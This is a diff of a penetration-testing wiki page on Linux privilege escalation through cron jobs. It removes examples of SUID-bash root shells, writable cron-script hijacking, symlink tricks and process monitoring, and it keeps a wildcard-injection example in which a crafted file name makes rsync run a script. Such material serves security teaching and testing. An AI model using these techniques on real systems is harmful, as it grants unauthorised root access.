@@ -118,69 +118,17 @@ strings /tmp/mem_ftp #User and password
 Read [https://book.hacktricks.xyz/linux-unix/privilege-escalation\#d-bus](https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus)
 {% endhint %}
 
-## Scheduled jobs
+## Cron
 
-Check if any scheduled job has any type of vulnerability. Maybe you can take advantage of any script that root executes sometimes \(wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?\).
+Check crontab to see if relative paths \(same logic as with `$PATH`\), symbolic links or wildcards are used, or any weird/not secure stuff is done.
 
-```bash
-crontab -l
-ls -al /etc/cron* /etc/at*
-cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
-```
-
-### Example: Cron path
-
-For example, inside _/etc/crontab_ you can find the sentence: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_
-
-If inside this crontab the root user tries to execute some command or script without setting the path. For example: _\* \* \* \* root overwrite.sh_
-
-Then, you can get a root shell by using:
+With wildcard you can do this kind of thing : 
 
 ```bash
-echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
-#Wait 1 min
-/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
+# Line present in the root cron : 
+rsync -a *.sh rsync://host.back/src/rbd 
+# Create a file called "-e sh myscript.sh" to have the script execute our file
 ```
-
-### Example: Cron using a script with a wildcard \(Wildcard Injection\)
-
-If a script being executed by root has an “**\***” inside a command, you could exploit this to make unexpected things \(like privesc\). Example:
-
-```bash
-rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
-```
-
-**The wildcard cannot be preceded of a path:** _**/some/path/\***_ **is not vulnerable \(even** _**./\***_ **is not\)**
-
-\*\*\*\*[**Read this for more Wildcards spare tricks**]()
-
-### Example: Cron script overwriting and symlink
-
-If you can write inside a cron script executed by root, you can get a shell very easily:
-
-```bash
-echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
-#Wait until it is executed
-/tmp/bash -p
-```
-
-If the script executed by root uses somehow a directory in which you have full access, maybe it could be useful to delete that folder and create a symlink folder to another one
-
-```bash
-ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
-```
-
-### Frequent cron jobs
-
-You can monitor the processes to search for processes that are being executed every 1,2 or 5 minutes. Maybe you can take advantage of it and escalate privileges.
-
-For example, to **monitor every 0.1s during 1 minute**, **sort by less executed commands** and deleting the commands that have beeing executed all the time, you can do:
-
-```bash
-for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
-```
-
-You could also use [pspy](https://github.com/DominicBreuker/pspy/releases) \(this will monitor every started process\).
 
 ## Commands with sudo and suid commands
 
